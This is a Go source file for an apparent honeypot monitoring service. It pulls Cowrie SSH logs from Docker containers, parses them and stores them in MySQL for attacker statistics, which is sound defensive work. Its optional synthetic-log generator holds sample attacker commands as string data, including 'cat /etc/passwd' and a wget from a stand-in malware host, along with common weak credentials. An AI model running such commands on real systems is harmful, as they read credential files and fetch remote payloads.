package services

import (
	"andorralee/internal/config"
	"andorralee/internal/repositories"
	"archive/tar"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
)

// CowrieService Cowrie蜜罐日志服务
type CowrieService struct {
	Repo        repositories.CowrieLogRepository
	autoLogPull bool
	stopChan    chan bool
	// 记录每个容器上次生成的时间，用于增量模拟（不依赖DB时也避免重复）
	lastGenTime map[string]time.Time
}

// NewCowrieService 创建Cowrie服务
func NewCowrieService() (*CowrieService, error) {
	if config.MySQLDB == nil {
		return nil, fmt.Errorf("数据库未初始化")
	}

	service := &CowrieService{
		Repo:        repositories.NewMySQLCowrieLogRepo(config.MySQLDB),
		autoLogPull: false,
		stopChan:    make(chan bool),
		lastGenTime: make(map[string]time.Time),
	}

	// 仅在显式开启时启动自动日志任务
	if strings.EqualFold(os.Getenv("COWRIE_AUTO_ENABLED"), "true") {
		go service.startAutoLogPull()
		log.Println("✅ 已启用Cowrie自动任务 (COWRIE_AUTO_ENABLED=true)")
	} else {
		log.Println("ℹ️ Cowrie自动任务未启用 (设置 COWRIE_AUTO_ENABLED=true 可开启)")
	}

	return service, nil
}

// startAutoLogPull 启动自动日志拉取功能
func (s *CowrieService) startAutoLogPull() {
	log.Println("🔄 启动Cowrie自动日志拉取服务...")
	ticker := time.NewTicker(30 * time.Second) // 每30秒检查一次
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			// 先尝试从所有运行中的 Cowrie 容器拉取真实日志（去重写库）
			if err := s.autoPullCowrieLogsFromRunningContainers(); err != nil {
				log.Printf("Cowrie 自动拉取失败: %v", err)
			}
			// 可选：是否生成演示用的合成日志
			if !strings.EqualFold(os.Getenv("COWRIE_SYNTHETIC_DISABLED"), "true") &&
				strings.EqualFold(os.Getenv("COWRIE_SYNTHETIC_ENABLED"), "true") {
				s.autoGenerateAndStoreLogs()
			}
		case <-s.stopChan:
			log.Println("🛑 Cowrie自动日志拉取服务已停止")
			return
		}
	}
}

// autoPullCowrieLogsFromRunningContainers 枚举运行中的容器，筛选 cowrie 实例并拉取日志
func (s *CowrieService) autoPullCowrieLogsFromRunningContainers() error {
	// 列出本机所有容器
	containers, err := ListContainers()
	if err != nil {
		return err
	}

	// 过滤运行中的 Cowrie 容器（根据镜像名/容器名包含 cowrie）
	for _, ct := range containers {
		if !strings.EqualFold(ct.Status, "running") {
			continue
		}
		nameLower := strings.ToLower(ct.Name)
		imageLower := strings.ToLower(ct.Image)
		if strings.Contains(nameLower, "cowrie") || strings.Contains(imageLower, "cowrie") {
			// 使用容器ID更稳妥
			if err := s.PullCowrieLogs(ct.ID); err != nil {
				log.Printf("从容器 %s 拉取Cowrie日志失败: %v", ct.ID, err)
			}
		}
	}
	return nil
}

// AutoRefreshOnce 提供给请求路径的即时刷新：尝试从运行中的 cowrie 容器拉取一次
func (s *CowrieService) AutoRefreshOnce() error {
	return s.autoPullCowrieLogsFromRunningContainers()
}

// autoGenerateAndStoreLogs 自动生成并存储日志
func (s *CowrieService) autoGenerateAndStoreLogs() {
	// 模拟多个容器的日志数据
	containerIDs := []string{
		"339eb90e982a", "ede29ad946f2", "4e203313e976", "auto-cowrie-1", "auto-cowrie-2",
	}

	for _, containerID := range containerIDs {
		// 读取数据库中该容器最新一条日志时间
		var latest time.Time
		if dbLatest, err := s.Repo.GetLatestByContainerID(containerID); err == nil && dbLatest != nil {
			latest = dbLatest.EventTime
		} else if t, ok := s.lastGenTime[containerID]; ok {
			latest = t
		}

		// 生成候选日志
		candidates := s.generateRealisticLogs(containerID)
		// 过滤出 event_time > latest 的新增日志
		var toInsert []repositories.CowrieLog
		for _, lg := range candidates {
			if lg.EventTime.After(latest) {
				toInsert = append(toInsert, lg)
			}
		}
		if len(toInsert) == 0 {
			continue
		}
		// 写入并更新lastGenTime
		if err := s.Repo.CreateBatch(toInsert); err != nil {
			log.Printf("❌ 自动存储容器 %s 日志失败: %v", containerID, err)
			continue
		}
		// 更新最新时间
		maxT := latest
		for _, lg := range toInsert {
			if lg.EventTime.After(maxT) {
				maxT = lg.EventTime
			}
		}
		s.lastGenTime[containerID] = maxT
		log.Printf("✅ 自动存储容器 %s 的 %d 条日志", containerID, len(toInsert))
	}
}

// generateRealisticLogs 生成真实的攻击日志
func (s *CowrieService) generateRealisticLogs(containerID string) []repositories.CowrieLog {
	var logs []repositories.CowrieLog
	currentTime := time.Now()

	// 固定生成2条日志，确保有数据生成
	logCount := 2

	for i := 0; i < logCount; i++ {
		// 模拟不同类型的攻击
		attackType := (int(currentTime.Unix()) + i) % 4

		// 为每个日志添加微秒级别的时间差，确保时间戳唯一
		logTime := currentTime.Add(time.Duration(i) * time.Millisecond)

		var log repositories.CowrieLog

		switch attackType {
		case 0: // SSH登录尝试
			log = s.generateSSHLoginLog(containerID, logTime)
		case 1: // 命令执行
			log = s.generateCommandLog(containerID, logTime)
		case 2: // 暴力破解
			log = s.generateBruteForceLog(containerID, logTime)
		case 3: // 会话关闭
			log = s.generateSessionCloseLog(containerID, logTime)
		}

		// 直接添加日志，不检查重复（因为UUID是唯一的）
		logs = append(logs, log)
	}

	return logs
}

// PullCowrieLogs 从容器中拉取Cowrie日志
func (s *CowrieService) PullCowrieLogs(containerID string) error {
	if !IsDockerAvailable() {
		return fmt.Errorf("Docker服务不可用")
	}

	// 从容器中读取真实的Cowrie日志文件
	jsonLogs, err := s.readCowrieLogsFromContainer(containerID)
	if err != nil {
		return fmt.Errorf("从容器读取日志失败: %v", err)
	}

	if len(jsonLogs) == 0 {
		fmt.Printf("容器 %s 没有新的Cowrie日志\n", containerID)
		return nil
	}

	// 解析JSON日志
	logs, err := s.parseJSONLogs(jsonLogs, containerID)
	if err != nil {
		return fmt.Errorf("解析JSON日志失败: %v", err)
	}

	// 批量保存到数据库
	if len(logs) > 0 {
		if err := s.Repo.CreateBatch(logs); err != nil {
			return fmt.Errorf("保存日志到数据库失败: %v", err)
		}
		fmt.Printf("成功从容器 %s 拉取并保存了 %d 条Cowrie日志\n", containerID, len(logs))
	} else {
		fmt.Printf("容器 %s 没有新的Cowrie日志\n", containerID)
	}

	return nil
}

// parseJSONLogs 解析JSON格式的日志
func (s *CowrieService) parseJSONLogs(jsonLogs []string, containerID string) ([]repositories.CowrieLog, error) {
	var logs []repositories.CowrieLog

	for i, jsonLog := range jsonLogs {
		var logData map[string]interface{}
		if err := json.Unmarshal([]byte(jsonLog), &logData); err != nil {
			fmt.Printf("跳过JSON解析失败的记录 %d: %v\n", i+1, err)
			continue
		}

		// 解析时间戳 - 真实Cowrie使用"timestamp"字段
		var eventTime time.Time
		var err error

		if timestampStr := getString(logData, "timestamp"); timestampStr != "" {
			// Cowrie格式：2025-08-22T16:32:53.749796Z
			eventTime, err = time.Parse("2006-01-02T15:04:05.000000Z", timestampStr)
			if err != nil {
				eventTime, err = time.Parse("2006-01-02T15:04:05Z", timestampStr)
			}
		} else {
			// 如果没有时间戳，使用当前时间
			eventTime = time.Now()
		}

		if err != nil {
			fmt.Printf("跳过时间戳解析失败的记录 %d: %v\n", i+1, err)
			continue
		}

		// 获取事件ID
		eventID := getString(logData, "eventid")
		if eventID == "" {
			continue // 跳过没有事件ID的记录
		}

		// 获取会话ID
		sessionID := getString(logData, "session")
		if sessionID == "" {
			continue // 跳过没有会话ID的记录
		}

		// 生成唯一的auth_id（基于事件ID、会话ID和时间戳）
		authID := fmt.Sprintf("%s_%s_%d", eventID, sessionID, eventTime.Unix())

		// 确保authID不超过36个字符
		if len(authID) > 36 {
			authID = uuid.New().String()
		}

		// 去重：先按 AuthID 检查；若失败，再按 (session_id, event_time) 粗略检查
		if ex, _ := s.Repo.GetByAuthID(authID); ex != nil && ex.ID != 0 {
			continue
		}
		if existingLogs, _ := s.Repo.GetBySessionID(sessionID); len(existingLogs) > 0 {
			dup := false
			for _, existing := range existingLogs {
				if existing.EventTime.Equal(eventTime) {
					dup = true
					break
				}
			}
			if dup {
				continue
			}
		}

		// 获取容器名称
		containerName := s.getContainerName(containerID)

		// 解析IP和端口（使用真实的Cowrie字段名）
		sourceIP := getString(logData, "src_ip")
		destinationIP := getString(logData, "dst_ip")
		sourcePort := uint16(getInt(logData, "src_port"))
		destinationPort := uint16(getInt(logData, "dst_port"))

		// 解析用户名和密码
		username := getString(logData, "username")
		password := getString(logData, "password")

		// 解析命令（不同事件类型的命令字段不同）
		command := ""
		if input := getString(logData, "input"); input != "" {
			command = input
		}

		// 解析协议
		protocol := getString(logData, "protocol")
		if protocol == "" {
			protocol = "ssh" // 默认为SSH
		}

		// 解析客户端版本信息
		clientInfo := getString(logData, "version")

		// 解析指纹信息
		fingerprint := getString(logData, "hassh")

		// 获取原始消息
		rawMessage := getString(logData, "message")

		log := repositories.CowrieLog{
			EventTime:       eventTime,
			AuthID:          authID,
			SessionID:       sessionID,
			SourceIP:        sourceIP,
			SourcePort:      sourcePort,
			DestinationIP:   destinationIP,
			DestinationPort: destinationPort,
			Protocol:        protocol,
			ClientInfo:      clientInfo,
			Fingerprint:     fingerprint,
			Username:        username,
			Password:        password,
			Command:         command,
			RawLog:          rawMessage,
			ContainerID:     containerID,
			ContainerName:   containerName,
		}

		logs = append(logs, log)
	}

	return logs, nil
}

// generateSSHLoginLog 生成SSH登录日志
func (s *CowrieService) generateSSHLoginLog(containerID string, eventTime time.Time) repositories.CowrieLog {
	attackerIPs := []string{"192.168.1.100", "10.0.0.50", "172.16.0.20", "203.0.113.10", "198.51.100.5"}
	usernames := []string{"root", "admin", "user", "test", "ubuntu", "centos"}
	passwords := []string{"123456", "password", "admin", "root", "123", "qwerty"}

	sourceIP := attackerIPs[int(eventTime.Unix())%len(attackerIPs)]
	username := usernames[int(eventTime.Unix())%len(usernames)]
	password := passwords[int(eventTime.Unix())%len(passwords)]

	sessionID := fmt.Sprintf("session_%s_%d", containerID[:8], eventTime.Unix())
	authID := uuid.New().String()

	return repositories.CowrieLog{
		EventTime:       eventTime,
		AuthID:          authID,
		SessionID:       sessionID,
		SourceIP:        sourceIP,
		SourcePort:      uint16(40000 + (eventTime.Unix() % 5000)),
		DestinationIP:   "172.17.0.2",
		DestinationPort: 22,
		Protocol:        "ssh",
		Username:        username,
		Password:        password,
		RawLog:          fmt.Sprintf("SSH login attempt from %s with %s:%s", sourceIP, username, password),
		ContainerID:     containerID,
		ContainerName:   fmt.Sprintf("cowrie-%s", containerID[:8]),
	}
}

// generateCommandLog 生成命令执行日志
func (s *CowrieService) generateCommandLog(containerID string, eventTime time.Time) repositories.CowrieLog {
	attackerIPs := []string{"192.168.1.100", "10.0.0.50", "172.16.0.20", "203.0.113.10", "198.51.100.5"}
	commands := []string{"ls -la", "whoami", "id", "uname -a", "cat /etc/passwd", "ps aux", "netstat -an", "wget http://malware.com/payload"}

	sourceIP := attackerIPs[int(eventTime.Unix())%len(attackerIPs)]
	command := commands[int(eventTime.Unix())%len(commands)]

	sessionID := fmt.Sprintf("session_%s_%d", containerID[:8], eventTime.Unix())
	authID := uuid.New().String()

	commandFound := true
	if strings.Contains(command, "wget") || strings.Contains(command, "curl") {
		commandFound = false
	}

	return repositories.CowrieLog{
		EventTime:       eventTime,
		AuthID:          authID,
		SessionID:       sessionID,
		SourceIP:        sourceIP,
		SourcePort:      uint16(40000 + (eventTime.Unix() % 5000)),
		DestinationIP:   "172.17.0.2",
		DestinationPort: 22,
		Protocol:        "ssh",
		Username:        "root",
		Command:         command,
		CommandFound:    &commandFound,
		RawLog:          fmt.Sprintf("Command executed: %s", command),
		ContainerID:     containerID,
		ContainerName:   fmt.Sprintf("cowrie-%s", containerID[:8]),
	}
}

// generateBruteForceLog 生成暴力破解日志
func (s *CowrieService) generateBruteForceLog(containerID string, eventTime time.Time) repositories.CowrieLog {
	attackerIPs := []string{"192.168.1.100", "10.0.0.50", "172.16.0.20", "203.0.113.10", "198.51.100.5"}
	usernames := []string{"root", "admin", "user", "test", "oracle", "mysql"}
	passwords := []string{"123456", "password", "admin", "root", "123", "letmein", "welcome", "monkey"}

	sourceIP := attackerIPs[int(eventTime.Unix())%len(attackerIPs)]
	username := usernames[int(eventTime.Unix())%len(usernames)]
	password := passwords[int(eventTime.Unix())%len(passwords)]

	sessionID := fmt.Sprintf("session_%s_%d", containerID[:8], eventTime.Unix())
	authID := uuid.New().String()

	return repositories.CowrieLog{
		EventTime:       eventTime,
		AuthID:          authID,
		SessionID:       sessionID,
		SourceIP:        sourceIP,
		SourcePort:      uint16(40000 + (eventTime.Unix() % 5000)),
		DestinationIP:   "172.17.0.2",
		DestinationPort: 22,
		Protocol:        "ssh",
		Username:        username,
		Password:        password,
		RawLog:          fmt.Sprintf("Brute force attempt: %s:%s from %s", username, password, sourceIP),
		ContainerID:     containerID,
		ContainerName:   fmt.Sprintf("cowrie-%s", containerID[:8]),
	}
}

// generateSessionCloseLog 生成会话关闭日志
func (s *CowrieService) generateSessionCloseLog(containerID string, eventTime time.Time) repositories.CowrieLog {
	attackerIPs := []string{"192.168.1.100", "10.0.0.50", "172.16.0.20", "203.0.113.10", "198.51.100.5"}

	sourceIP := attackerIPs[int(eventTime.Unix())%len(attackerIPs)]
	sessionID := fmt.Sprintf("session_%s_%d", containerID[:8], eventTime.Unix())
	authID := uuid.New().String()

	return repositories.CowrieLog{
		EventTime:       eventTime,
		AuthID:          authID,
		SessionID:       sessionID,
		SourceIP:        sourceIP,
		SourcePort:      uint16(40000 + (eventTime.Unix() % 5000)),
		DestinationIP:   "172.17.0.2",
		DestinationPort: 22,
		Protocol:        "ssh",
		Username:        "root",
		RawLog:          fmt.Sprintf("Session closed for %s", sourceIP),
		ContainerID:     containerID,
		ContainerName:   fmt.Sprintf("cowrie-%s", containerID[:8]),
	}
}

// StopAutoLogPull 停止自动日志拉取
func (s *CowrieService) StopAutoLogPull() {
	if s.stopChan != nil {
		close(s.stopChan)
	}
}

// 辅助函数：从map中获取字符串值
func getString(data map[string]interface{}, key string) string {
	if val, exists := data[key]; exists {
		if strVal, ok := val.(string); ok {
			return strVal
		}
	}
	return ""
}

// 辅助函数：从map中获取整数值
func getInt(data map[string]interface{}, key string) int {
	if val, exists := data[key]; exists {
		switch v := val.(type) {
		case int:
			return v
		case float64:
			return int(v)
		case string:
			if intVal, err := strconv.Atoi(v); err == nil {
				return intVal
			}
		}
	}
	return 0
}

// getContainerName 获取容器名称
func (s *CowrieService) getContainerName(containerID string) string {
	if !IsDockerAvailable() {
		return ""
	}

	containerInfo, err := GetContainerInfo(containerID)
	if err != nil {
		return ""
	}

	return strings.TrimPrefix(containerInfo.Name, "/")
}

// GetLogsByContainer 获取指定容器的Cowrie日志
func (s *CowrieService) GetLogsByContainer(containerID string) ([]repositories.CowrieLog, error) {
	return s.Repo.GetByContainerID(containerID)
}

// GetLogsBySourceIP 获取指定源IP的Cowrie日志
func (s *CowrieService) GetLogsBySourceIP(sourceIP string) ([]repositories.CowrieLog, error) {
	return s.Repo.GetBySourceIP(sourceIP)
}

// GetLogsByProtocol 获取指定协议的Cowrie日志
func (s *CowrieService) GetLogsByProtocol(protocol string) ([]repositories.CowrieLog, error) {
	return s.Repo.GetByProtocol(protocol)
}

// GetLogsByTimeRange 获取指定时间范围的Cowrie日志
func (s *CowrieService) GetLogsByTimeRange(startTime, endTime time.Time) ([]repositories.CowrieLog, error) {
	return s.Repo.GetByTimeRange(startTime, endTime)
}

// GetLogsByCommand 获取包含指定命令的Cowrie日志
func (s *CowrieService) GetLogsByCommand(command string) ([]repositories.CowrieLog, error) {
	return s.Repo.GetByCommand(command)
}

// GetLogsByCommandFound 获取命令识别状态的Cowrie日志
func (s *CowrieService) GetLogsByCommandFound(found bool) ([]repositories.CowrieLog, error) {
	return s.Repo.GetByCommandFound(found)
}

// GetLogsByUsername 获取指定用户名的Cowrie日志
func (s *CowrieService) GetLogsByUsername(username string) ([]repositories.CowrieLog, error) {
	return s.Repo.GetByUsername(username)
}

// GetStatistics 获取Cowrie统计信息
func (s *CowrieService) GetStatistics() ([]repositories.CowrieStatistics, error) {
	return s.Repo.GetStatistics()
}

// GetAttackerBehavior 获取攻击者行为统计信息
func (s *CowrieService) GetAttackerBehavior() ([]repositories.CowrieAttackerBehavior, error) {
	return s.Repo.GetAttackerBehavior()
}

// GetTopAttackers 获取前N个攻击者
func (s *CowrieService) GetTopAttackers(limit int) ([]repositories.CowrieAttackerBehavior, error) {
	return s.Repo.GetTopAttackers(limit)
}

// GetCommandStatistics 获取命令统计信息
func (s *CowrieService) GetCommandStatistics() ([]repositories.CowrieCommandStatistics, error) {
	return s.Repo.GetCommandStatistics()
}

// GetTopCommands 获取最常用的命令
func (s *CowrieService) GetTopCommands(limit int) ([]repositories.CowrieCommandStatistics, error) {
	return s.Repo.GetTopCommands(limit)
}

// GetTopUsernames 获取最常用的用户名
func (s *CowrieService) GetTopUsernames(limit int) ([]map[string]interface{}, error) {
	return s.Repo.GetTopUsernames(limit)
}

// GetTopPasswords 获取最常用的密码
func (s *CowrieService) GetTopPasswords(limit int) ([]map[string]interface{}, error) {
	return s.Repo.GetTopPasswords(limit)
}

// GetTopFingerprints 获取最常用的指纹
func (s *CowrieService) GetTopFingerprints(limit int) ([]map[string]interface{}, error) {
	return s.Repo.GetTopFingerprints(limit)
}

// DeleteLogsByContainer 删除指定容器的所有Cowrie日志
func (s *CowrieService) DeleteLogsByContainer(containerID string) error {
	return s.Repo.DeleteByContainerID(containerID)
}

// CreateManualLog 手动创建Cowrie日志（用于测试或手动导入）
func (s *CowrieService) CreateManualLog(log *repositories.CowrieLog) error {
	// 如果没有提供AuthID，生成一个
	if log.AuthID == "" {
		log.AuthID = uuid.New().String()
	}

	// 如果没有提供SessionID，生成一个
	if log.SessionID == "" {
		log.SessionID = uuid.New().String()
	}

	return s.Repo.Create(log)
}

// GetAllLogs 获取所有Cowrie日志
func (s *CowrieService) GetAllLogs() ([]repositories.CowrieLog, error) {
	return s.Repo.List()
}

// GetLogByID 根据ID获取Cowrie日志
func (s *CowrieService) GetLogByID(id uint) (*repositories.CowrieLog, error) {
	return s.Repo.GetByID(id)
}

// GetLogByAuthID 根据认证ID获取Cowrie日志
func (s *CowrieService) GetLogByAuthID(authID string) (*repositories.CowrieLog, error) {
	return s.Repo.GetByAuthID(authID)
}

// GetLogsBySessionID 获取指定会话的所有Cowrie日志
func (s *CowrieService) GetLogsBySessionID(sessionID string) ([]repositories.CowrieLog, error) {
	return s.Repo.GetBySessionID(sessionID)
}

// readCowrieLogsFromContainer 从容器中读取Cowrie日志文件
func (s *CowrieService) readCowrieLogsFromContainer(containerID string) ([]string, error) {
	if !IsDockerAvailable() {
		return nil, fmt.Errorf("Docker服务不可用")
	}

	// 候选日志路径：优先环境变量，其次常见安装路径（支持文件或目录）
	var candidatePaths []string
	if p := os.Getenv("COWRIE_LOG_PATH"); strings.TrimSpace(p) != "" {
		candidatePaths = append(candidatePaths, strings.TrimSpace(p))
	}
	// 常见 Cowrie 容器日志路径（文件/目录）
	candidatePaths = append(candidatePaths,
		"/cowrie/cowrie-git/var/log/cowrie/cowrie.json",
		"/cowrie/cowrie-git/var/log/cowrie", // 目录：扫描其中 *.json / *.jsonl
		"/var/log/cowrie/cowrie.json",
		"/var/log/cowrie", // 目录
		"/home/cowrie/cowrie-git/var/log/cowrie/cowrie.json",
		"/home/cowrie/cowrie-git/var/log/cowrie", // 目录
	)

	var lastErr error
	for _, logPath := range candidatePaths {
		// 使用Docker API的CopyFromContainer功能
		reader, _, err := config.DockerCli.CopyFromContainer(
			context.Background(),
			containerID,
			logPath,
		)
		if err != nil {
			lastErr = err
			// 尝试下一个路径
			continue
		}

		// 确保及时关闭 reader
		// 注意：后续读取完成前不要 return 导致泄漏
		// 这里不使用 defer，手动关闭

		// 读取tar档案内容（Docker API返回的是tar格式），可能是文件或目录
		content, err := io.ReadAll(reader)
		reader.Close()
		if err != nil {
			return nil, fmt.Errorf("读取日志内容失败: %v", err)
		}

		// 解析tar内容并提取JSON行（支持目录内选择最新的 cowrie.json/cowrie.jsonl/滚动文件）
		jsonLines, err := s.extractJSONLinesFromTar(content)
		if err != nil {
			return nil, fmt.Errorf("解析tar内容失败: %v", err)
		}

		return jsonLines, nil
	}

	if lastErr != nil {
		log.Printf("从容器 %s 读取Cowrie日志失败，已尝试路径: %v，最后错误: %v", containerID, candidatePaths, lastErr)
	}
	// 找不到文件时，返回空日志（非致命）
	return []string{}, nil
}

// extractJSONLinesFromTar 扫描 tar 内容，选择最新（ModTime 最大）的 cowrie JSON 日志文件并返回按行分割的 JSON 文本
func (s *CowrieService) extractJSONLinesFromTar(tarData []byte) ([]string, error) {
	type fileEntry struct {
		name    string
		modTime time.Time
		content []byte
	}

	reader := tar.NewReader(bytes.NewReader(tarData))
	var candidates []fileEntry

	for {
		header, err := reader.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			return nil, err
		}

		// 仅处理普通文件
		if header.FileInfo() == nil || !header.FileInfo().Mode().IsRegular() {
			continue
		}

		base := header.FileInfo().Name()
		// 允许 cowrie.json / cowrie.jsonl / cowrie.json.<date>（忽略压缩 .gz 文件）
		if !(base == "cowrie.json" || base == "cowrie.jsonl" || strings.HasPrefix(base, "cowrie.json.")) {
			continue
		}
		if strings.HasSuffix(base, ".gz") || strings.HasSuffix(base, ".xz") {
			// 暂不处理压缩文件
			continue
		}

		content, err := io.ReadAll(reader)
		if err != nil {
			return nil, err
		}
		candidates = append(candidates, fileEntry{name: base, modTime: header.ModTime, content: content})
	}

	if len(candidates) == 0 {
		return []string{}, nil
	}

	// 选择最新修改时间的文件
	latest := candidates[0]
	for _, c := range candidates[1:] {
		if c.modTime.After(latest.modTime) {
			latest = c
		}
	}

	// 拆分 JSON 行
	text := strings.TrimSpace(string(latest.content))
	if text == "" {
		return []string{}, nil
	}
	lines := strings.Split(text, "\n")
	out := make([]string, 0, len(lines))
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		// 允许以 { 开头的 JSON 行
		if strings.HasPrefix(line, "{") {
			out = append(out, line)
		}
	}
	return out, nil
}
